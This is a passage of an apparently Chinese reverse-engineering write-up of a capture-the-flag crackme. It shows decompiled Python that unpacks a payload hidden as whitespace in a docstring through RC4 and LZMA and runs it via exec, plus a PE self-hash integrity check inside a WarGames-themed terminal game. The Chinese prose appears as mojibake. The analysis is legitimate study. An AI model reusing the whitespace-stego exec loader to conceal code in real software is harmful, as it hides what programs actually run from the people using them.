class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">eye</span>(<span class="params">face</span>):</span></span><br><span class="line">    leg = io.BytesIO()</span><br><span class="line">    <span class="keyword">for</span> arm <span class="keyword">in</span> face.splitlines():</span><br><span class="line">        print(arm)</span><br><span class="line">        arm = arm[len(arm.rstrip(<span class="string">&#x27; \t&#x27;</span>)):]</span><br><span class="line">        leg.write(arm)</span><br><span class="line"></span><br><span class="line">    face = leg.getvalue()</span><br><span class="line">    bell = io.BytesIO()</span><br><span class="line">    x, y = (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> chuck <span class="keyword">in</span> face:</span><br><span class="line">        taxi = &#123;<span class="number">9</span>:<span class="number">0</span>, </span><br><span class="line">         <span class="number">32</span>:<span class="number">1</span>&#125;.get(chuck)</span><br><span class="line">        <span class="keyword">if</span> taxi <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        x, y = x | taxi &lt;&lt; y, y + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> y &gt; <span class="number">7</span>:</span><br><span class="line">            bell.write(bytes([x]))</span><br><span class="line">            x, y = (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> bell.getvalue()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fire</span>(<span class="params">wood, bounce</span>):</span></span><br><span class="line">    meaning = bytearray(wood)</span><br><span class="line">    bounce = bytearray(bounce)</span><br><span class="line">    regard = len(bounce)</span><br><span class="line">    manage = list(range(<span class="number">256</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">prospect</span>(<span class="params">*financial</span>):</span></span><br><span class="line">        <span class="keyword">return</span> sum(financial) % <span class="number">256</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">blade</span>(<span class="params">feel, cassette</span>):</span></span><br><span class="line">        cassette = prospect(cassette, manage[feel])</span><br><span class="line">        manage[feel], manage[cassette] = manage[cassette], manage[feel]</span><br><span class="line">        <span class="keyword">return</span> cassette</span><br><span class="line"></span><br><span class="line">    cassette = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> feel <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        cassette = prospect(cassette, bounce[(feel % regard)])</span><br><span class="line">        cassette = blade(feel, cassette)</span><br><span class="line"></span><br><span class="line">    cassette = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> pigeon, _ <span class="keyword">in</span> enumerate(meaning):</span><br><span class="line">        feel = prospect(pigeon, <span class="number">1</span>)</span><br><span class="line">        cassette = blade(feel, cassette)</span><br><span class="line">        meaning[pigeon] ^= manage[prospect(manage[feel], manage[cassette])]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bytes(meaning)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(lzma.decompress(fire(eye(__doc__.encode()), bytes([i]) + BOUNCE)))</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>ä»–ä¼šå–<code>__doc__</code> é‡Œçš„åˆ¶è¡¨ç¬¦å’Œç©ºæ ¼è¿›è¡Œç¼–ç ï¼Œç„¶årc4è§£å¯†ï¼Œç„¶åè§£å‹ç¼©ï¼Œä½†æ˜¯ python-uncompyle6 è¿™ä¸ªåç¼–è¯‘åçš„ä»£ç æ²¡æœ‰äº† åˆ¶è¡¨ç¬¦ï¼Œåé¢æˆ‘åˆæœäº†ä¸ªå·¥å…·å« pycdc é‡æ–°åç¼–è¯‘ï¼Œå¾—åˆ°äº†ä¸€éƒ¨åˆ†æ–°ä»£ç ã€‚</p><p>ä½†æ˜¯åé¢å‘ç°æ²¡æœ‰è¾“å‡ºï¼Œæœ€åå‘ç°å‰é¢æœ‰ä¸€æ®µä»£ç å°†print æ›¿æ¢æˆäº†exec</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line">GREETINGS = [<span class="string">&quot;HI&quot;</span>, <span class="string">&quot;HELLO&quot;</span>, <span class="string">&quot;&#x27;SUP&quot;</span>, <span class="string">&quot;AHOY&quot;</span>, <span class="string">&quot;ALOHA&quot;</span>, <span class="string">&quot;HOWDY&quot;</span>, <span class="string">&quot;GREETINGS&quot;</span>, <span class="string">&quot;ZDRAVSTVUYTE&quot;</span>]</span><br><span class="line">STRATEGIES = [<span class="string">&#x27;U.S. FIRST STRIKE&#x27;</span>, <span class="string">&#x27;USSR FIRST STRIKE&#x27;</span>, <span class="string">&#x27;NATO / WARSAW PACT&#x27;</span>, <span class="string">&#x27;FAR EAST STRATEGY&#x27;</span>, <span class="string">&#x27;US USSR ESCALATION&#x27;</span>, <span class="string">&#x27;MIDDLE EAST WAR&#x27;</span>, <span class="string">&#x27;USSR CHINA ATTACK&#x27;</span>, <span class="string">&#x27;INDIA PAKISTAN WAR&#x27;</span>, <span class="string">&#x27;MEDITERRANEAN WAR&#x27;</span>, <span class="string">&#x27;HONGKONG VARIANT&#x27;</span>, <span class="string">&#x27;SEATO DECAPITATING&#x27;</span>, <span class="string">&#x27;CUBAN PROVOCATION&#x27;</span>, <span class="string">&#x27;ATLANTIC HEAVY&#x27;</span>, <span class="string">&#x27;CUBAN PARAMILITARY&#x27;</span>, <span class="string">&#x27;NICARAGUAN PREEMPTIVE&#x27;</span>, <span class="string">&#x27;PACIFIC TERRITORIAL&#x27;</span>, <span class="string">&#x27;BURMESE THEATERWIDE&#x27;</span>, <span class="string">&#x27;TURKISH DECOY&#x27;</span>, <span class="string">&#x27;ARGENTINA ESCALATION&#x27;</span>, <span class="string">&#x27;ICELAND MAXIMUM&#x27;</span>, <span class="string">&#x27;ARABIAN THEATERWIDE&#x27;</span>, <span class="string">&#x27;U.S. SUBVERSION&#x27;</span>, <span class="string">&#x27;AUSTRALIAN MANEUVER&#x27;</span>, <span class="string">&#x27;SUDAN SURPRISE&#x27;</span>, <span class="string">&#x27;NATO TERRITORIAL&#x27;</span>, <span class="string">&#x27;ZAIRE ALLIANCE&#x27;</span>, <span class="string">&#x27;ICELAND INCIDENT&#x27;</span>, <span class="string">&#x27;ENGLISH ESCALATION&#x27;</span>, <span class="string">&#x27;MIDDLE EAST HEAVY&#x27;</span>, <span class="string">&#x27;MEXICAN TAKEOVER&#x27;</span>, <span class="string">&#x27;CHAD ALERT&#x27;</span>, <span class="string">&#x27;SAUDI MANEUVER&#x27;</span>, <span class="string">&#x27;AFRICAN TERRITORIAL&#x27;</span>, <span class="string">&#x27;ETHIOPIAN ESCALATION&#x27;</span>, <span class="string">&#x27;TURKISH HEAVY&#x27;</span>, <span class="string">&#x27;NATO INCURSION&#x27;</span>, <span class="string">&#x27;U.S. DEFENSE&#x27;</span>, <span class="string">&#x27;CAMBODIAN HEAVY&#x27;</span>, <span class="string">&#x27;PACT MEDIUM&#x27;</span>, <span class="string">&#x27;ARCTIC MINIMAL&#x27;</span>, <span class="string">&#x27;MEXICAN DOMESTIC&#x27;</span>, <span class="string">&#x27;TAIWAN THEATERWIDE&#x27;</span>, <span class="string">&#x27;PACIFIC MANEUVER&#x27;</span>, <span class="string">&#x27;PORTUGAL REVOLUTION&#x27;</span>, <span class="string">&#x27;ALBANIAN DECOY&#x27;</span>, <span class="string">&#x27;PALESTINIAN LOCAL&#x27;</span>, <span class="string">&#x27;MOROCCAN MINIMAL&#x27;</span>, <span class="string">&#x27;BAVARIAN DIVERSITY&#x27;</span>, <span class="string">&#x27;CZECH OPTION&#x27;</span>, <span class="string">&#x27;FRENCH ALLIANCE&#x27;</span>, <span class="string">&#x27;ARABIAN CLANDESTINE&#x27;</span>, <span class="string">&#x27;GABON REBELLION&#x27;</span>, <span class="string">&#x27;NORTHERN MAXIMUM&#x27;</span>, <span class="string">&#x27;DANISH PARAMILITARY&#x27;</span>, <span class="string">&#x27;SEATO TAKEOVER&#x27;</span>, <span class="string">&#x27;HAWAIIAN ESCALATION&#x27;</span>, <span class="string">&#x27;IRANIAN MANEUVER&#x27;</span>, <span class="string">&#x27;NATO CONTAINMENT&#x27;</span>, <span class="string">&#x27;SWISS INCIDENT&#x27;</span>, <span class="string">&#x27;CUBAN MINIMAL&#x27;</span>, <span class="string">&#x27;CHAD ALERT&#x27;</span>, <span class="string">&#x27;ICELAND ESCALATION&#x27;</span>, <span class="string">&#x27;VIETNAMESE RETALIATION&#x27;</span>, <span class="string">&#x27;SYRIAN PROVOCATION&#x27;</span>, <span class="string">&#x27;LIBYAN LOCAL&#x27;</span>, <span class="string">&#x27;GABON TAKEOVER&#x27;</span>, <span class="string">&#x27;ROMANIAN WAR&#x27;</span>, <span class="string">&#x27;MIDDLE EAST OFFENSIVE&#x27;</span>, <span class="string">&#x27;DENMARK MASSIVE&#x27;</span>, <span class="string">&#x27;CHILE CONFRONTATION&#x27;</span>, <span class="string">&#x27;S.AFRICAN SUBVERSION&#x27;</span>, <span class="string">&#x27;USSR ALERT&#x27;</span>, <span class="string">&#x27;NICARAGUAN THRUST&#x27;</span>, <span class="string">&#x27;GREENLAND DOMESTIC&#x27;</span>, <span class="string">&#x27;ICELAND HEAVY&#x27;</span>, <span class="string">&#x27;KENYA OPTION&#x27;</span>, <span class="string">&#x27;PACIFIC DEFENSE&#x27;</span>, <span class="string">&#x27;UGANDA MAXIMUM&#x27;</span>, <span class="string">&#x27;THAI SUBVERSION&#x27;</span>, <span class="string">&#x27;ROMANIAN STRIKE&#x27;</span>, <span class="string">&#x27;PAKISTAN SOVEREIGNTY&#x27;</span>, <span class="string">&#x27;AFGHAN MISDIRECTION&#x27;</span>, <span class="string">&#x27;ETHIOPIAN LOCAL&#x27;</span>, <span class="string">&#x27;ITALIAN TAKEOVER&#x27;</span>, <span class="string">&#x27;VIETNAMESE INCIDENT&#x27;</span>, <span class="string">&#x27;ENGLISH PREEMPTIVE&#x27;</span>, <span class="string">&#x27;DENMARK ALTERNATE&#x27;</span>, <span class="string">&#x27;THAI CONFRONTATION&#x27;</span>, <span class="string">&#x27;TAIWAN SURPRISE&#x27;</span>, <span class="string">&#x27;BRAZILIAN STRIKE&#x27;</span>, <span class="string">&#x27;VENEZUELA SUDDEN&#x27;</span>, <span class="string">&#x27;MALAYSIAN ALERT&#x27;</span>, <span class="string">&#x27;ISREAL DISCRETIONARY&#x27;</span>, <span class="string">&#x27;LIBYAN ACTION&#x27;</span>, <span class="string">&#x27;PALESTINIAN TACTICAL&#x27;</span>, <span class="string">&#x27;NATO ALTERNATE&#x27;</span>, <span class="string">&#x27;CYPRESS MANEUVER&#x27;</span>, <span class="string">&#x27;EGYPT MISDIRECTION&#x27;</span>, <span class="string">&#x27;BANGLADESH THRUST&#x27;</span>, <span class="string">&#x27;KENYA DEFENSE&#x27;</span>, <span class="string">&#x27;BANGLADESH CONTAINMENT&#x27;</span>, <span class="string">&#x27;VIETNAMESE STRIKE&#x27;</span>, <span class="string">&#x27;ALBANIAN CONTAINMENT&#x27;</span>, <span class="string">&#x27;GABON SURPRISE&#x27;</span>, <span class="string">&#x27;IRAQ SOVEREIGNTY&#x27;</span>, <span class="string">&#x27;VIETNAMESE SUDDEN&#x27;</span>, <span class="string">&#x27;LEBANON INTERDICTION&#x27;</span>, <span class="string">&#x27;TAIWAN DOMESTIC&#x27;</span>, <span class="string">&#x27;ALGERIAN SOVEREIGNTY&#x27;</span>, <span class="string">&#x27;ARABIAN STRIKE&#x27;</span>, <span class="string">&#x27;ATLANTIC SUDDEN&#x27;</span>, <span class="string">&#x27;MONGOLIAN THRUST&#x27;</span>, <span class="string">&#x27;POLISH DECOY&#x27;</span>, <span class="string">&#x27;ALASKAN DISCRETIONARY&#x27;</span>, <span class="string">&#x27;CANADIAN THRUST&#x27;</span>, <span class="string">&#x27;ARABIAN LIGHT&#x27;</span>, <span class="string">&#x27;S.AFRICAN DOMESTIC&#x27;</span>, <span class="string">&#x27;TUNISIAN INCIDENT&#x27;</span>, <span class="string">&#x27;MALAYSIAN MANEUVER&#x27;</span>, <span class="string">&#x27;JAMAICA DECOY&#x27;</span>, <span class="string">&#x27;MALAYSIAN MINIMAL&#x27;</span>, <span class="string">&#x27;RUSSIAN SOVEREIGNTY&#x27;</span>, <span class="string">&#x27;CHAD OPTION&#x27;</span>, <span class="string">&#x27;BANGLADESH WAR&#x27;</span>, <span class="string">&#x27;BURMESE CONTAINMENT&#x27;</span>, <span class="string">&#x27;ASIAN THEATERWIDE&#x27;</span>, <span class="string">&#x27;BULGARIAN CLANDESTINE&#x27;</span>, <span class="string">&#x27;GREENLAND INCURSION&#x27;</span>, <span class="string">&#x27;EGYPT SURGICAL&#x27;</span>, <span class="string">&#x27;CZECH HEAVY&#x27;</span>, <span class="string">&#x27;TAIWAN CONFRONTATION&#x27;</span>, <span class="string">&#x27;GREENLAND MAXIMUM&#x27;</span>, <span class="string">&#x27;UGANDA OFFENSIVE&#x27;</span>, <span class="string">&#x27;CASPIAN DEFENSE&#x27;</span>, <span class="string">&#x27;CRIMEAN GAMBIT&#x27;</span>, <span class="string">&#x27;BRITISH ANTICS&#x27;</span>, <span class="string">&#x27;HUNGARIAN EXPULSION&#x27;</span>, <span class="string">&#x27;VENEZUELAN COLLAPSE&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wrong</span>():</span></span><br><span class="line">    trust = windll.kernel32.GetModuleHandleW(<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">    computer = string_at(trust, <span class="number">1024</span>)</span><br><span class="line">    dirty, = struct.unpack_from(<span class="string">&#x27;=I&#x27;</span>, computer, <span class="number">60</span>)</span><br><span class="line"></span><br><span class="line">    _, _, organize, _, _, _, variety, _ =  struct.unpack_from(<span class="string">&#x27;=IHHIIIHH&#x27;</span>, computer, dirty)</span><br><span class="line">    <span class="keyword">assert</span> variety &gt;= <span class="number">144</span></span><br><span class="line"></span><br><span class="line">    participate, = struct.unpack_from(<span class="string">&#x27;=I&#x27;</span>, computer, dirty + <span class="number">40</span>)</span><br><span class="line">    <span class="keyword">for</span> insurance <span class="keyword">in</span> range(organize):</span><br><span class="line">        name, tropical, inhabitant, reader, chalk, _, _, _, _, _ = struct.unpack_from(<span class="string">&#x27;=8sIIIIIIHHI&#x27;</span>, computer, <span class="number">40</span> * insurance + dirty + variety + <span class="number">24</span>)</span><br><span class="line">        <span class="keyword">if</span> inhabitant &lt;= participate &lt; inhabitant + tropical:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    spare = bytearray(string_at(trust + inhabitant, tropical))</span><br><span class="line">    </span><br><span class="line">    issue, digital = struct.unpack_from(<span class="string">&#x27;=II&#x27;</span>, computer, dirty + <span class="number">0xa0</span>)</span><br><span class="line">    truth = string_at(trust + issue, digital)</span><br><span class="line"></span><br><span class="line">    expertise = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> expertise &lt;= len(truth) - <span class="number">8</span>:</span><br><span class="line">        nuance, seem = struct.unpack_from(<span class="string">&#x27;=II&#x27;</span>, truth, expertise)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> nuance == <span class="number">0</span> <span class="keyword">and</span> seem == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        slot = truth[expertise + <span class="number">8</span>:expertise + seem]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(slot) &gt;&gt; <span class="number">1</span>):</span><br><span class="line">            diet, = struct.unpack_from(<span class="string">&#x27;=H&#x27;</span>, slot, <span class="number">2</span> * i)</span><br><span class="line">            fabricate = diet &gt;&gt; <span class="number">12</span></span><br><span class="line">            <span class="keyword">if</span> fabricate != <span class="number">3</span>: <span class="keyword">continue</span></span><br><span class="line">            diet = diet &amp; <span class="number">4095</span></span><br><span class="line">            ready = nuance + diet - inhabitant</span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> &lt;= ready &lt; len(spare): </span><br><span class="line">                struct.pack_into(<span class="string">&#x27;=I&#x27;</span>, spare, ready, struct.unpack_from(<span class="string">&#x27;=I&#x27;</span>, spare, ready)[<span class="number">0</span>] - trust)</span><br><span class="line"></span><br><span class="line">        expertise += seem</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(spare).digest()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Terminal</span>(<span class="params">object</span>):</span></span><br><span class="line">        </span><br><span class="line">    DELAY = <span class="number">0.02</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">self, text</span>):</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> text.splitlines(<span class="literal">True</span>):</span><br><span class="line">            sys.stdout.write(line)</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">            time.sleep(self.DELAY)     </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">typewrite</span>(<span class="params">self, text</span>):</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">            <span class="keyword">if</span> char == <span class="string">&#x27;\n&#x27;</span>:</span><br><span class="line">                sys.stdout.write(char)</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                time.sleep(self.DELAY)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                sys.stdout.write(char.lower())</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                time.sleep(self.DELAY)</span><br><span class="line">                sys.stdout.write(<span class="string">&#x27;\b&#x27;</span> + char)</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">typewriteln</span>(<span class="params">self, text</span>):</span></span><br><span class="line">        self.typewrite(text + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27; &#x27;</span>.join(<span class="string">&#x27;&#x27;</span>.join(_ <span class="keyword">for</span> _ <span class="keyword">in</span> input().upper() <span class="keyword">if</span> _ <span class="keyword">in</span> <span class="string">&#x27; 0123456789ABCDEFGHIJKLMNOPQRSTUVWXZY?&#x27;</span>).split())</span><br><span class="line">t = Terminal()</span><br><span class="line"></span><br><span class="line">xor = [<span class="number">212</span>, <span class="number">162</span>, <span class="number">242</span>, <span class="number">218</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">50</span>, <span class="number">31</span>, <span class="number">125</span>, <span class="number">112</span>, <span class="number">249</span>, <span class="number">83</span>, <span class="number">55</span>, <span class="number">187</span>, <span class="number">131</span>, <span class="number">206</span>]</span><br><span class="line">h = list(wrong())</span><br><span class="line">h = [h[i] ^ xor[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)]</span><br><span class="line"></span><br><span class="line">t.write(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">      _/\/\______/\/\____/\/\/\/\____/\/\/\/\/\____/\/\/\/\/\___</span></span><br><span class="line"><span class="string">     _/\/\__/\__/\/\__/\/\____/\/\__/\/\____/\/\__/\/\____/\/\_</span></span><br><span class="line"><span class="string">    _/\/\/\/\/\/\/\__/\/\____/\/\__/\/\/\/\/\____/\/\/\/\/\___</span></span><br><span class="line"><span class="string">   _/\/\/\__/\/\/\__/\/\____/\/\__/\/\__________/\/\__/\/\___</span></span><br><span class="line"><span class="string">  _/\/\______/\/\____/\/\/\/\____/\/\__________/\/\____/\/\_</span></span><br><span class="line"><span class="string"> __________________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">t.typewrite(<span class="string">&#x27;GREETINGS PROFESSOR FALKEN.\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    t.typewrite(<span class="string">&#x27;\n&gt; &#x27;</span>)</span><br><span class="line">    cmd = t.read()</span><br><span class="line">    <span class="keyword">if</span> cmd.rstrip(<span class="string">&#x27;!?&#x27;</span>) <span class="keyword">in</span> GREETINGS:</span><br><span class="line">        t.typewriteln(random.choice(GREETINGS))</span><br><span class="line">    <span class="keyword">elif</span> cmd == <span class="string">&#x27;HELP GAMES&#x27;</span>:</span><br><span class="line">        t.typewriteln(<span class="string">&quot;&#x27;GAMES&#x27; REFERS TO MODELS, SIMULATIONS AND GAMES\nWHICH HAVE TACTICAL AND STRATEGIC APPLICATIONS.&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> cmd == <span class="string">&#x27;LIST GAMES&#x27;</span>:</span><br><span class="line">        t.typewriteln(<span class="string">&#x27;FALKEN\&#x27;S MAZE\nTIC-TAC-TOE\nGLOBAL THERMONUCLEAR WAR&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> cmd <span class="keyword">in</span> (<span class="string">&#x27;HELP&#x27;</span>, <span class="string">&#x27;?&#x27;</span>):</span><br><span class="line">        t.typewriteln(<span class="string">&#x27;AVAILABLE COMMANDS:\nHELP\nHELP GAMES\nLIST GAMES\nPLAY &lt;game&gt;&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> cmd.startswith(<span class="string">&#x27;HELP &#x27;</span>):</span><br><span class="line">        t.typewriteln(<span class="string">&#x27;HELP NOT AVAILABLE&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> cmd == <span class="string">&#x27;PLAY&#x27;</span>:</span><br><span class="line">        t.typewriteln(<span class="string">&#x27;WHICH GAME?&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> cmd.startswith(<span class="string">&#x27;PLAY F&#x27;</span>) <span class="keyword">or</span> cmd == <span class="string">&#x27;PLAY 1&#x27;</span>:</span><br><span class="line">        t.typewriteln(<span class="string">&#x27;GAME IS TEMPORARILY UNAVAILABLE DUE TO MAINTENANCE&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> cmd.startswith(<span class="string">&#x27;PLAY T&#x27;</span>) <span class="keyword">or</span> cmd == <span class="string">&#x27;PLAY 2&#x27;</span>:</span><br><span class="line">        t.typewriteln(<span class="string">&#x27;GAME IS TEMPORARILY UNAVAILABLE DUE TO MAINTENANCE&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> cmd.startswith(<span class="string">&#x27;PLAY G&#x27;</span>) <span class="keyword">or</span> cmd <span class="keyword">in</span> (<span class="string">&#x27;PLAY ARMAGEDDON&#x27;</span>, <span class="string">&#x27;PLAY 3&#x27;</span>):</span><br><span class="line">        t.typewriteln(<span class="string">&#x27;*** GAME ROUTINE RUNNING ***&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">elif</span> cmd.startswith(<span class="string">&#x27;PLAY &#x27;</span>):</span><br><span class="line">        t.typewriteln(<span class="string">&#x27;THAT GAME IS NOT AVAILABLE&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        t.typewriteln(<span class="string">&#x27;COMMAND NOT RECOGNIZED&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">t.write(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">r&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;7ooooo&quot;&quot;&quot;oooooo&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;7</span></span><br><span class="line"><span class="string">|           .__Looooooo &quot;&quot;7oooooooo`     &#x27;ooo&quot;   &quot;&quot;._,    .JooL_,    .___     |</span></span><br><span class="line"><span class="string">o  __L______oLoooooooo7o_, |oooor&quot;&quot;       ._____,,Jo__JoooooooooooooJoooL_____J</span></span><br><span class="line"><span class="string">r7._ooooooooooooooo&quot;JoJoo|  oor   &#x27;o`   .Jooo7oooooooooooooooooooooooooooo&quot;oo&quot;7</span></span><br><span class="line"><span class="string">| &#x27;`&quot;&#x27;`   ooooooooooL,Jooo_,         _oL.ooLoooooooooooooooooooooooooo_  |r`  |</span></span><br><span class="line"><span class="string">|         &#x27;&#x27;ooooooooooooooJo         &quot;&quot;oooooooooor&quot;ooooooooooooooooooo7       |</span></span><br><span class="line"><span class="string">|           7oooooooooo&quot;             |or`oo&#x27;ooJoJo |ooooooooooooooro ./       |</span></span><br><span class="line"><span class="string">|            &quot;oooooo7o`              JooooJ_JLJoooLJoooooooooooooo, or        |</span></span><br><span class="line"><span class="string">|             &#x27;&quot;oo|  oo            .oooooooooooroooJo&quot;7oooooooooo7,           |</span></span><br><span class="line"><span class="string">|   &quot;&quot;          &quot;&quot;`oorL|L,         |ooooooooooooooo&quot;`  7or` 7ooo |,           |</span></span><br><span class="line"><span class="string">|                   